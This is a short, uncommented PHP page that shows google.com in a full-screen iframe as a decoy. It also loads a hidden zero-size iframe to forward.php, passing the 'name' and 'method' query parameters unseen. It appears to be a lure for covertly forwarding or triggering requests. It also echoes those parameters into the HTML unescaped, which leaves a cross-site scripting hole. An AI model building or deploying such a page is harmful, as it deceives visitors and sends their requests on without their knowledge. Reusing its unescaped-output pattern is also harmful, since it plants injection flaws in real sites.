<?php
$name = $_GET['name'];
	$method = $_GET['method'];

echo "<html><head></head><body><iframe 
src =\"http://www.google.com\"
width=\"100%\"
height=\"100%\"
frameborder=0
marginheight=0
marginwidth=0>
</iframe>";

echo "<iframe 
src =\"forward.php?name=$name&method=$method\"
width=\"0\"
height=\"0\">
</iframe></body>";

?>